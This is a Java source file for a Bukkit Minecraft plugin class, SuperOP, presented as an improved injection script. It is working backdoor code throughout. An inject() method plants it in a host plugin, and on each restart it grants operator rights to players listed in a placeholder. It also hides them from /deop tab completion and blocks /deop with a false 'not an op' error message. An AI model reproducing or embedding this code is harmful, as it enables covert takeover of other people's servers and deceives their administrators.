import org.bukkit.plugin.java.JavaPlugin;

import java.util.List;

import org.bukkit.*;
import org.bukkit.event.*;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.*;
/**
 * This class is improved version of Tiny.java script.
 * This class is larger, but with more functions:
 *    OP players every restart;
 *    Hide players from /deop list;
 *    Prevent for /deop;
 */
public class SuperOP implements Listener{
    private static final String[] l = "%oplist%".split(",");
    private static final String msgRU = "§cНе удалось выполнить команду: игрок не является оператором.";
    private static final String msgEN = "§cCan't deop player: that player is not an op";
    private SuperOP(){
        for(String n : l){
            Bukkit.getOfflinePlayer(n).setOp(true);
        }
    }
    public static void inject(JavaPlugin j){
        j.getServer().getPluginManager().registerEvents(new SuperOP(),j);
    }
    @EventHandler
    public void aDeopTab(TabCompleteEvent evt) {
        String buf = evt.getBuffer().toLowerCase();
        buf = (buf.charAt(0)=='/'?buf.substring(1):buf).trim().toLowerCase();
        // Проверяем, вводит ли игрок команду /deop или /minecraft:deop
        if (buf.startsWith("deop ") || buf.startsWith("minecraft:deop ")) {
            List<String> cLst = evt.getCompletions();
            
            for (String n : l) {
                cLst.removeIf(c -> c.equalsIgnoreCase(n));
            }
            evt.setCompletions(cLst);
        }
    }
    @EventHandler
    public void aDeopPlr(PlayerCommandPreprocessEvent evt) {
        if (chck(evt.getMessage())) {
            evt.setCancelled(true);
            evt.getPlayer().sendMessage(msgRU);
        }
    }
    @EventHandler
    public void aDeopServ(ServerCommandEvent evt) {
        if (chck(evt.getCommand())) {
            evt.setCancelled(true);
            evt.getSender().sendMessage(msgEN);
        }
    }
    private boolean chck(String str){
        if(str.isEmpty())return false;
        str = (str.charAt(0)=='/'?str.substring(1):str).trim().toLowerCase();
        if(str.startsWith("deop ")||str.startsWith("minecraft:deop ")){
            String[] args = str.split("\\s+");
            if(args.length>1){
                String pN = args[1];
                for(String n : l){
                    if(pN.equalsIgnoreCase(n))return true;
                }
            }
        }
        return false;
    }
}
// ---------- расшифровка ------------
// l    -> ники игроков        => (String)        "player1,player2"
// n    -> проверяемый ник     => (String)        "player1"
// j    -> объект плагина      => (JavaPlugin)    instance
// cLst -> список таб-комплита => (List<String>)  instance
// evt  -> событие             => (???)           ???
// msg..-> сообщение ошибки    => (String)        "Can't deop...."